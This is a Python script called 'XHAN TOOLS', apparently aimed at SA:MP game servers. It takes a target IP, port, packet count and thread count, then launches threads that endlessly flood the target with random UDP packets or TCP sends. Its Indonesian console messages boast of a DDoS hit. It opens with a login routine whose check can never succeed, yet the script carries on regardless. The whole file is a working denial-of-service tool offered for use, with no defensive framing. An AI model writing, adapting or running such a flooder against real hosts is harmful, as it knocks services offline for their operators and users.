#!/usr/bin/env python3
#Code by Han
import time
import random
import os
import socket
import threading

os.system("clear")

UserList = []
PassList = []

print("Weclome To XHAN TOOLS")

ans = input("Do you have an account with please enter y/n:")

if ans == 'n':
    User = input("Please type your username: ")
    UserList.append(User)
    Pass = input("Please type your password: ")
    PassList.append(Pass)
    print(UserList,PassList)
    print("You have created your new accoutn with GipCo, please login\n")
    User1 = input("Please enter your username: ")
    Pass1 = input("Please enter your password: ")
    if User1 == (UserList) and Pass1 == (PassList):
        print("Welcome to XHAN TOOLS, type MENU to enter: ")

    else:
        print("Incorrect username or Password")

    
os.system("clear")
print("""
██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
╚██╗██╔╝██║░░██║██╔══██╗████╗░██║
░╚███╔╝░███████║███████║██╔██╗██║
░██╔██╗░██╔══██║██╔══██║██║╚████║
██╔╝╚██╗██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝""")
print("Subs Han SA:MP")

ip = str(input("> HOST/IP:"))
port = int(input("> PORT:"))
choice = str(input("> Password:"))
times = int(input("> Packet:"))
threads = int(input("> Theards:"))
def run():
	data = random._urandom(20000)
	i = random.choice(("\033[31mAHHH KOK NEMBUSS","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[31mCROOT...CROTTT")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(160)
	i = random.choice(("\033[31mAHHHHHH KOKKK NEMBUSSS","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[31mHIYAA KENA DDOS","","")
		except:
			s.close()
			print("[*] Error")
			time.sleep(.1)
            
for v in range(threads):
	if choice == '19':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
